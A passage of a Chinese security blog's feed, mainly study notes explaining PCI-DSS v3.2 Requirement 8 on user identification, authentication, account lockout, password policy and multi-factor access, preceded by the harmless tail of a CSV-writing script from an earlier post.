writer.writerow(value_array)</span><br><span class="line">        print(&apos;第&#123;&#125;条数据写入完成&apos;.format(a-1))</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;校园提供给第三方的接口信息泄露&quot;&gt;&lt;a href=&quot;#校园提供给第三方
      
    
    </summary>
    
      <category term="水平权限" scheme="https://XD0ne.github.io/categories/%E6%B0%B4%E5%B9%B3%E6%9D%83%E9%99%90/"/>
    
    
      <category term="水平权限" scheme="https://XD0ne.github.io/tags/%E6%B0%B4%E5%B9%B3%E6%9D%83%E9%99%90/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(八)</title>
    <link href="https://XD0ne.github.io/2018/06/10/21.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AB)/"/>
    <id>https://XD0ne.github.io/2018/06/10/21. PCI-DSS(V3.2.1)学习笔记(八)/</id>
    <published>2018-06-10T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.799Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="PCI-DSS-V3-2-学习笔记-八"><a href="#PCI-DSS-V3-2-学习笔记-八" class="headerlink" title="PCI-DSS(V3.2)学习笔记(八)"></a>PCI-DSS(V3.2)学习笔记(八)</h1><hr><h1 id="四、实施强效的访问控制"><a href="#四、实施强效的访问控制" class="headerlink" title="四、实施强效的访问控制"></a>四、实施强效的访问控制</h1><h2 id="要求8：识别并验证对系统组件的访问"><a href="#要求8：识别并验证对系统组件的访问" class="headerlink" title="要求8：识别并验证对系统组件的访问"></a>要求8：识别并验证对系统组件的访问</h2><p>实施强效的访问控制，我们在要求7中已经针对用户对持卡人的访问进行限制了，对于一个强效的访问控制，我们不但要有明确的访问权限控制，同时我们也要确保每一个访问时授权的，是通过我们的验证的，防止有绕过我们访问限制机制来进行访问，所以我们对用户的访问还是要经过识别和验证的。<br>只有通过对访问请求的识别的验证，我们才能通过这个对系统组件的访问或者操作请求。<br>为了达到上面的要求，我们通过为所有有访问权限的角色分配唯一的id标识符，这样能让每个人对自己的操作负责，同时也为后面的通过用户id来识别提供标志。</p><h3 id="8-1-规定并实施政策和程序，确保对所有系统组件中的非消费者用户和管理员执行以下适当的用户识别管理"><a href="#8-1-规定并实施政策和程序，确保对所有系统组件中的非消费者用户和管理员执行以下适当的用户识别管理" class="headerlink" title="8.1 规定并实施政策和程序，确保对所有系统组件中的非消费者用户和管理员执行以下适当的用户识别管理"></a>8.1 规定并实施政策和程序，确保对所有系统组件中的非消费者用户和管理员执行以下适当的用户识别管理</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-6921dfb030e7c6bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1"><br>对于非消费者用户，比如我们公司的员工，对于这些用户，在他们对系统组件进行访问或者操作请求是要有身份识别。对于消费者用户是完全没有权限访问的，所有不在我们前面说的白名单里面，是被默认拒绝所有给拒绝了的。<br>这里可能会有一点歧义，这里的意思是所有的非消费者用户和管理员用户都得必须经过这个用户识别的过程，就是管理员用户也得经过这个审核。</p><h4 id="8-1-1-允许用户访问系统组件或持卡人数据之前，为期分配唯一ID"><a href="#8-1-1-允许用户访问系统组件或持卡人数据之前，为期分配唯一ID" class="headerlink" title="8.1.1 允许用户访问系统组件或持卡人数据之前，为期分配唯一ID"></a>8.1.1 允许用户访问系统组件或持卡人数据之前，为期分配唯一ID</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-f6b199b708bec201.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.1"><br>首先就是确保我们的用户在访问系统组件的时候有已经分配好的唯一识别的ID，这样确保在后期审核检查的时候可以根据ID找到对应的员工用户，明确每一个操作的责任。</p><h5 id="8-1-2-控制添加、删除和修改用户ID、凭证和其他标识符对象"><a href="#8-1-2-控制添加、删除和修改用户ID、凭证和其他标识符对象" class="headerlink" title="8.1.2 控制添加、删除和修改用户ID、凭证和其他标识符对象"></a>8.1.2 控制添加、删除和修改用户ID、凭证和其他标识符对象</h5><p><img src="https://upload-images.jianshu.io/upload_images/6269327-caa7a1d737fd02ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.2"><br>我们前面一个说了根据标识符来明确每一个操作的责任，所以对于这个标识符来说我们要确保他是正确的，没有被恶意删改过得。<br>对于这个标识符的删改我们应该有强有力的控制手段，确保每一个删改都是有效的。攻击者很可能更改标识符ID来隐藏自己的痕迹，使我们更难找到漏洞。</p><h4 id="8-1-3-立即撤销到期用户的访问权"><a href="#8-1-3-立即撤销到期用户的访问权" class="headerlink" title="8.1.3 立即撤销到期用户的访问权"></a>8.1.3 立即撤销到期用户的访问权</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-bf5fa2dca2b5379d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.3"><br>对于有期限的用户，或者说离职员工的用户等，我们要在第一时间撤销他们的访问权限。有些时候就会出现，我删除了某个用户，但是他对某些系统组件的访问权限还在，所以我们不仅要确保用户被安全删除并且撤销了用户的所有访问权限。<br>同时残留的员工数据可能不会受到足够安全的保护，这些信息会很容易泄露，若果没有妥善的处理这些账号遗留的权限，会带来不必要的麻烦。</p><h4 id="8-1-4-在90天内删除-禁用非活动的用户账户"><a href="#8-1-4-在90天内删除-禁用非活动的用户账户" class="headerlink" title="8.1.4 在90天内删除/禁用非活动的用户账户"></a>8.1.4 在90天内删除/禁用非活动的用户账户</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c411d7ed57b3e667.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.4"><br>对于非活动用户的清理这在各种论坛网站上是很常见的，比如自己学校的bt站，pt站。定期删除这些不活动的账户也是很有必要的，首先这些可能是被攻击者恶意注册的账号，同时也减轻了我们服务器的压力，为需要的用户更好的提供服务。其次，对于注册条件困难的系统，不活跃的用户，更容易被攻击者攻击，从而获取用户数据或者进行进一步的攻击。</p><h4 id="8-1-5-通过如下远程访问管理第三方用于访问、支持或维护系统组件的ID"><a href="#8-1-5-通过如下远程访问管理第三方用于访问、支持或维护系统组件的ID" class="headerlink" title="8.1.5 通过如下远程访问管理第三方用于访问、支持或维护系统组件的ID"></a>8.1.5 通过如下远程访问管理第三方用于访问、支持或维护系统组件的ID</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-d5cd1b6459842f3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.5"><br> 1、仅在需要的时间段启用并在不用时禁用<br> 2、使用时进行监控<br>因为一些业务或者其他的需要，我们经常会让第三方来访问我们的系统组件，我们可能会为他们分配指定的远程账户，或者公开，这样就增加了攻击者进入我们网络进行攻击行为的可能性。<br>比如我们在使用某个组件，需要服务商定期进行检测，这个时候就会对他们开放某个链接进行访问，如果攻击者发现这个链接，很有可能就利用这个进行攻击。<br>所以我们对于对第三方的访问，我们需要定时开放，需要的时候允许访问，不需要的时候则要禁止其的访问，其次在第三方访问的时候我们也要进行监控，及时发现攻击者的恶意访问。</p><h4 id="8-1-6-在不超过6次尝试后锁定用户ID，从而限制反复的访问尝试"><a href="#8-1-6-在不超过6次尝试后锁定用户ID，从而限制反复的访问尝试" class="headerlink" title="8.1.6 在不超过6次尝试后锁定用户ID，从而限制反复的访问尝试"></a>8.1.6 在不超过6次尝试后锁定用户ID，从而限制反复的访问尝试</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-cec85de3d91de47e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.6"><br>嗯，确实很需要，但是对于错误次数要有一定的控制，因为这里我们是需要牺牲一部分的用户体验来换取更安全的环境。<br>但是这部分牺牲我觉得是十分值得的，对于密码的爆破现在已经被无数黑产做成了易建华攻击工具，网络上数不胜数。所以对于密码错误而锁定ID的要求是很有必要的，但是也有很多厂商更改成其他的比如错误一定次数后限制时间尝试，并且限制的时间依次上升，就比如iphone，这也是一样的效果，抵御了密码的爆破。</p><h4 id="8-1-7-将锁定时间设为最少30分钟或直到管理员启用用户ID"><a href="#8-1-7-将锁定时间设为最少30分钟或直到管理员启用用户ID" class="headerlink" title="8.1.7 将锁定时间设为最少30分钟或直到管理员启用用户ID"></a>8.1.7 将锁定时间设为最少30分钟或直到管理员启用用户ID</h4><p>好吧，这里所说的锁定用户和我上面说的是一个意思。我们可以根据系统的重要程度来确定锁定时间，如果是及其重要的系统，可以直接锁定，知道管理员启用用户ID。<br>但是到这里大家就会发现，这里面其实也是有漏洞的，记得之前有一个网上竞拍的例子，用户B为了以最低价格购买商品，在竞拍快结束时，恶意登录用户A的账户，直至被锁定，然后以较低价格购买商品。<br>在这里我们会发现，我们使用的安全策略有可能影响用户体验，甚至出现BUG，被人恶意利用获利。<br>所以每一项安全策略都不是完美的，牺牲某些东西来换取系统的安全。</p><h4 id="8-1-8-如果某会话空闲超过15分钟，则需要重新验证用户来重新激活终端或会话"><a href="#8-1-8-如果某会话空闲超过15分钟，则需要重新验证用户来重新激活终端或会话" class="headerlink" title="8.1.8 如果某会话空闲超过15分钟，则需要重新验证用户来重新激活终端或会话"></a>8.1.8 如果某会话空闲超过15分钟，则需要重新验证用户来重新激活终端或会话</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-a908378b58d41701.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.8"><br>如果用户在离开设备后没有安全退出系统，攻击者很有可能窃用了用户的身份，导致信息的泄露。所以对于一定时间未进行任何操作的用户我们需要对其进行注销，比如设置无动作不能超过15分钟。</p><h3 id="8-2-处理分配唯一ID以外，至少采用以下一种方法来验证所有用户，确保对所有系统组件中的非消费者用户和管理员执行恰当的用户验证管理"><a href="#8-2-处理分配唯一ID以外，至少采用以下一种方法来验证所有用户，确保对所有系统组件中的非消费者用户和管理员执行恰当的用户验证管理" class="headerlink" title="8.2 处理分配唯一ID以外，至少采用以下一种方法来验证所有用户，确保对所有系统组件中的非消费者用户和管理员执行恰当的用户验证管理"></a>8.2 处理分配唯一ID以外，至少采用以下一种方法来验证所有用户，确保对所有系统组件中的非消费者用户和管理员执行恰当的用户验证管理</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-11dc522932b1fe2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2"><br>1、所知，如密码或口令<br>2、所有，如令牌设备或智能卡等<br>3、个人特征，如生物特征<br>我们除了分配唯一的标识符之外还得用其他的方法来验证用户身份，这里提到三个方法，基本业内使用的也都是这三种方法。首先是，口令或密码，我觉得这是远远不够的，所以可能还需要其他的方法，物理设备，令牌或者智能卡。以及第三种，个人特征，比如指纹或者虹膜等。<br>唯一的ID识别很容易被窃取，所以我们还需要其他的方法来验证用户身份。</p><h4 id="8-2-1-使用强效加密法使所有验证凭证（例如密码-口令）在所有系统组件中传输和存储时均不可读"><a href="#8-2-1-使用强效加密法使所有验证凭证（例如密码-口令）在所有系统组件中传输和存储时均不可读" class="headerlink" title="8.2.1 使用强效加密法使所有验证凭证（例如密码/口令）在所有系统组件中传输和存储时均不可读"></a>8.2.1 使用强效加密法使所有验证凭证（例如密码/口令）在所有系统组件中传输和存储时均不可读</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c28e3530fdbcb51a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.1"><br>对于我们前面使用的验证凭证，我们需要确保其安全的存储，不会被删改，就和前面的ID标识符一样。我们使用强效的加密手段，确保这些验证凭证在传输和存储的时候都不可读，不会泄露。如果未被加密，很有可能就会被攻击者嗅探获取，盗用身份。</p><h4 id="8-2-2-在修改任何验证凭证（例如，执行密码重置、提供新令牌或生成新密钥）前验证用户身份"><a href="#8-2-2-在修改任何验证凭证（例如，执行密码重置、提供新令牌或生成新密钥）前验证用户身份" class="headerlink" title="8.2.2 在修改任何验证凭证（例如，执行密码重置、提供新令牌或生成新密钥）前验证用户身份"></a>8.2.2 在修改任何验证凭证（例如，执行密码重置、提供新令牌或生成新密钥）前验证用户身份</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-9626eb6da424bba0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.2"><br>就是我们在修改用户的身份验证凭证的时候，我们要确保是我在修改我的密码，而不是别人在修改我的密码。这里系统需要确认的是提交修改人的身份，我们就通过之前的验证凭证来验证用户的身份。<br>这里第一次提到了社交工程蓄，就说说吧。就算我们安全措施做的很多，攻击者的手段层出不穷，道高一尺，魔高一丈。<br>一个叫“社交工程学”的攻击手段在国内外十分的流行，让我来形容“社工”，就是四个字，坑蒙拐骗。通过各种渠道，骗取你的密码，已经不是对一个系统来寻找漏洞，而是对一个人来寻找漏洞。钓鱼邮件就是典型的社工的一种，对于不同性格的人使用不同的钓鱼邮件链接，记得英国有一个著名的黑客攻击事件，就是利用领养猫的钓鱼邮件获取密码的。</p><h4 id="8-2-3-密码-口令必须符合以下要求："><a href="#8-2-3-密码-口令必须符合以下要求：" class="headerlink" title="8.2.3 密码/口令必须符合以下要求："></a>8.2.3 密码/口令必须符合以下要求：</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-678f2d7286a0ce55.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.3"><br>1、要求长度至少为7个字符<br>2、同时包含数字和字母字符<br>或者，密码/口令必须具有至少与上面指定参数相当的复杂度和强度<br>密码强度也是一个很愁人的问题，毕竟现在密码负担也是一个大难题。我们对于密码强度的要求，必须在一个合适的范围内，密码强度要求低了密码很容易会被攻击者猜到，密码强度高了同样不行，有的人就会很奇怪，密码强度难道不是越高越好吗，很多调查显示不是这样的。<br>比如我们现在要求密码10位以上要有字母，数字，特殊符号，这就会有很多姓名拼音+生日+符号的组合，或者类似于qwer1234！@#￥这样的有规律的密码出现。所以合适的密码强度也很重要。<br>同时不要使用默认密码！！！进过很多公司，在注册时还会显示默认密码123456，很奇葩，怕攻击者找不到方法。还有在变更密码强度策略时，比如之前没有密码强度校验，现在增加密码强度校验，必须对已经注册的没有达到标准的用户先提示，在强制性的更改成达到标准的密码。<br>对于这个密码强度，行业内也有标准，比如： NIST SP 800-63。</p><h4 id="8-2-4-至少每90天变更一次用户密码-口令"><a href="#8-2-4-至少每90天变更一次用户密码-口令" class="headerlink" title="8.2.4 至少每90天变更一次用户密码/口令"></a>8.2.4 至少每90天变更一次用户密码/口令</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-36d5fb9a6dbfc85c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.4"><br>医生也推荐我们每3个月换一次牙刷，因为一个牙刷用久了，很多这个牙刷清理不到的地方会有很多残留的污渍。因为我们的牙刷不是完美的。我们的密码也是一样的，我们的密码不可能是别人永远无法猜到的，所以我们需要定时的更新密码。但是当有严重的泄露风险时要及时更换。</p><h4 id="8-2-5-不允许个人提交与最近使用的4个密码-口令中任何一个相同的新密码-口令"><a href="#8-2-5-不允许个人提交与最近使用的4个密码-口令中任何一个相同的新密码-口令" class="headerlink" title="8.2.5 不允许个人提交与最近使用的4个密码/口令中任何一个相同的新密码/口令"></a>8.2.5 不允许个人提交与最近使用的4个密码/口令中任何一个相同的新密码/口令</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-a3ca12a9f25a0182.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.5-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-d7bf20db45f120fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.5-2"><br>的确有为了自己方便的用户，为了应对服务商的3个月变更密码的要求就只有两个密码，轮着换，虽然方便，但是很不安全。所有我们也不能允许新密码与之前四次的密码相同，至于为什么是四次，这个应该就是大数据调查吧，低了容易泄露，高了容易让用户每次设置有规律的密码。</p><h4 id="8-2-6-将每个用户首次使用的密码-口令和重置密码-口令设为唯一值，并在首次使用后立即变更"><a href="#8-2-6-将每个用户首次使用的密码-口令和重置密码-口令设为唯一值，并在首次使用后立即变更" class="headerlink" title="8.2.6 将每个用户首次使用的密码/口令和重置密码/口令设为唯一值，并在首次使用后立即变更"></a>8.2.6 将每个用户首次使用的密码/口令和重置密码/口令设为唯一值，并在首次使用后立即变更</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-d52f0322ab1e7ba5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.6"><br>就是确保用户注册时的第一个密码的唯一，不能和其他用户重复，如果每个新用户比如IBM公司的员工都用IBM2018.这样的密码，那就很容易被发现。这个在公司内部很多都是很常见的。因为个人的密码负担，很多人会将密码和所属系统联系在一些，比如公司名等。所有密码的唯一性也很重要。</p><h3 id="8-3-使用多因素验证保护对CDE的所有单独飞控制台管理访问和所有远程访问"><a href="#8-3-使用多因素验证保护对CDE的所有单独飞控制台管理访问和所有远程访问" class="headerlink" title="8.3 使用多因素验证保护对CDE的所有单独飞控制台管理访问和所有远程访问"></a>8.3 使用多因素验证保护对CDE的所有单独飞控制台管理访问和所有远程访问</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-56c9d37c6a644fcd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.3"><br>对与持卡人数据环境的远程访问，或者非控制台访问，我们要使用多因素验证。这里的多因素就是说的前面的三种验证手段中的两种或两种以上，不包括一种方法使用两次，那样安全性的提升并不是很大。</p><h3 id="8-3-1-将针对所有非控制台访问的多因素验证融入针对具有管理访问权限的工作人员的CDE"><a href="#8-3-1-将针对所有非控制台访问的多因素验证融入针对具有管理访问权限的工作人员的CDE" class="headerlink" title="8.3.1 将针对所有非控制台访问的多因素验证融入针对具有管理访问权限的工作人员的CDE"></a>8.3.1 将针对所有非控制台访问的多因素验证融入针对具有管理访问权限的工作人员的CDE</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-72a263462a7c684f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.3.1"><br>这是针对所有有权限访问持卡人数据环境的工作人员。<br>这里按照指南可以看到如果持卡人数据环境和其他网络环境没有隔离，那就在具有访问权的工作人员进入这个网络的时候要执行多因素认证。<br>如果持卡人数据环境和其他网络分离了，那就在拥有访问权限的工作人员从其他网络环境进入持卡人数据环境的时候进行多因素验证。</p><h3 id="8-3-2-针对来自实体网络外部的所有远程网络访问（针对用户和管理员，并包括出于支持和维护目的的第三方访问）加入多因素验证"><a href="#8-3-2-针对来自实体网络外部的所有远程网络访问（针对用户和管理员，并包括出于支持和维护目的的第三方访问）加入多因素验证" class="headerlink" title="8.3.2 针对来自实体网络外部的所有远程网络访问（针对用户和管理员，并包括出于支持和维护目的的第三方访问）加入多因素验证"></a>8.3.2 针对来自实体网络外部的所有远程网络访问（针对用户和管理员，并包括出于支持和维护目的的第三方访问）加入多因素验证</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-e7ff72a8fad72118.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.3.2"><br>对于来自外部互联网的对公司内部网络的所有远程访问都要用多因素认证。<br>多因素认证在外网远程访问公司内网的情况下，主要是针对员工用户和管理员或者因其他需求导致的第三方访问。</p><h3 id="8-4-为所有用户编写并传达验证政策和程序"><a href="#8-4-为所有用户编写并传达验证政策和程序" class="headerlink" title="8.4 为所有用户编写并传达验证政策和程序"></a>8.4 为所有用户编写并传达验证政策和程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-6fe848d535c2da9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.4"><br>包括：<br>1、选择强效验证凭证的指南<br>2、关于用户应如何保护其验证凭证的指南<br>3、关于不重用之前用过的密码的说明<br>4、在怀疑密码可能受到威胁的情况下更改密码的相关说明<br>这个相当于对前面要求的一个总结，对于前面的这些要求，很多是针对用户来说的，我们要有相应的方法，指导用户按着我们的要求执行，所有我们要有相关的指南。<br>比如选择强效验证凭证的指南，告诉用户密码强度的要求，以及不要使用有规律的密码等。<br>向所有的用户传达这些要求和指南他们保证他们了解并遵守。</p><h3 id="8-5-不要使用群组、共享或常规的ID、密码或其他验证方法"><a href="#8-5-不要使用群组、共享或常规的ID、密码或其他验证方法" class="headerlink" title="8.5 不要使用群组、共享或常规的ID、密码或其他验证方法"></a>8.5 不要使用群组、共享或常规的ID、密码或其他验证方法</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c8f6f1846e24a132.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.5"><br>具体如下：<br>1、常规用户ID已禁用或删除<br>2、用于系统管理和其他重要功能的共享用户ID不存在<br>3、不使用共享和常规用户ID管理任何系统组件<br>之前已经说过ID标识符是对应个人的，不能一个ID对应多个人员，这样无法追究到具体操作到具体人员。以及删除那些不必要的常规ID或者共享ID等多余功能。</p><h4 id="8-5-1-可远程访问客户所在地的服务提供商（例如，为支持POS系统或服务器）须针对每个客户使用唯一的验证凭证（例如密码-口令）（仅针对服务商的额外要求）"><a href="#8-5-1-可远程访问客户所在地的服务提供商（例如，为支持POS系统或服务器）须针对每个客户使用唯一的验证凭证（例如密码-口令）（仅针对服务商的额外要求）" class="headerlink" title="8.5.1 可远程访问客户所在地的服务提供商（例如，为支持POS系统或服务器）须针对每个客户使用唯一的验证凭证（例如密码/口令）（仅针对服务商的额外要求）"></a>8.5.1 可远程访问客户所在地的服务提供商（例如，为支持POS系统或服务器）须针对每个客户使用唯一的验证凭证（例如密码/口令）（仅针对服务商的额外要求）</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c3548ea5ffc46d08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.5.1"><br>服务商要确保为每一个客户提供唯一的不同的验证凭证。多个客户使用同一个验证凭证，对于每个客户来说都是很危险的。</p><h3 id="8-6-在使用其他验证机制（例如物理或逻辑安全令牌、智能卡、证书等）的情形下，须按照下述要求分配这些机制的用法："><a href="#8-6-在使用其他验证机制（例如物理或逻辑安全令牌、智能卡、证书等）的情形下，须按照下述要求分配这些机制的用法：" class="headerlink" title="8.6 在使用其他验证机制（例如物理或逻辑安全令牌、智能卡、证书等）的情形下，须按照下述要求分配这些机制的用法："></a>8.6 在使用其他验证机制（例如物理或逻辑安全令牌、智能卡、证书等）的情形下，须按照下述要求分配这些机制的用法：</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-1896cb33d059fabc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.6-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-a1de791f3520f820.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.6-2"><br>1、验证机制必须分配到单个账户，不得在多个账户之间共享<br>2、必须要有物理和/或逻辑控制，以确保仅既定账户可使用该机制获得访问权限<br>对于前面说的验证机制的除了第一个密码的其他两个，令牌设备或智能卡和个人特征，我们也要有和ID一样，每一个验证数据仅对应一个账号，不能多人共享！<br>通过物理或逻辑控制（比如指纹，虹膜）我们可以防止非授权用户通过共享的方法或的访问权。因为这些是可以唯一识别用户的。</p><h3 id="8-7-已按照下述要求限制了对任何包含持卡人数据的数据库的所有访问（包括应用程序、管理员和其他所有用户的访问）"><a href="#8-7-已按照下述要求限制了对任何包含持卡人数据的数据库的所有访问（包括应用程序、管理员和其他所有用户的访问）" class="headerlink" title="8.7 已按照下述要求限制了对任何包含持卡人数据的数据库的所有访问（包括应用程序、管理员和其他所有用户的访问）"></a>8.7 已按照下述要求限制了对任何包含持卡人数据的数据库的所有访问（包括应用程序、管理员和其他所有用户的访问）</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-b1bf2f95e07827ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.8"><br>1、用户对数据库的所有访问、查询和操作均通过编程方法完成<br>2、仅数据库管理员能直接访问或查询数据库<br>3、数据库应用程序的应用程序ID仅可由这些应用程序使用（个人用户或其他非应用程序流程不能使用）<br>针对持卡人数据所在数据库来说，我们对每一个用户对这个数据库的访问都必须进行验证。同时验证完身份之后我们要保证所有的数据库操作都是通过存储代码或程序执行的，而不是用户自己执行的，不是用户访问数据库执行的。<br>权限方面，只有数据库的管理员可以直接访问和查询数据库。且对于那些访问了数据库的应用程序我们确认这个应用程序的ID仅仅可他自己使用，不会被其他流程或个人调用。<br>感觉这一条包含的信息还是很多的，但是经验不足，体会不出里面的精髓。之后会补上。</p><h3 id="8-8-确保已记录，正在使用且所有相关方了解用于身份是被和验证的安全政策与操作程序"><a href="#8-8-确保已记录，正在使用且所有相关方了解用于身份是被和验证的安全政策与操作程序" class="headerlink" title="8.8 确保已记录，正在使用且所有相关方了解用于身份是被和验证的安全政策与操作程序"></a>8.8 确保已记录，正在使用且所有相关方了解用于身份是被和验证的安全政策与操作程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-cd09c4e84da75b2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.8"><br>对于用于身份识别和验证的安全政策与操作程序我们按照要求指定了相应的政策，我们要有详细的记录，并确保相关人员以及进行学习并严格遵守。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实施强效的访问控制，识别并验证对系统组件的访问。要求8的这些都是围绕对系统组件访问的识别和验证。识别和验证就会涉及到验证数据，所以里面也说到了密码策略，以及三个眼政方案。<br>很全面的，唯一想说的是密码策略中的安全策略很多都是牺牲了其他的来换取安全，可能我们牺牲了用户体验，或者工作人员的便利但是换取的安全是十分值得的。但是在公司制定安全策略的时候还是得因地制宜，根据不同的需求制定不同的策略。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-八&quot;&gt;&lt;a href=&quot;#PCI-
      
    
    </summary>
    
      <category term="安全知识" scheme="https://XD0ne.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://XD0ne.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
</feed>
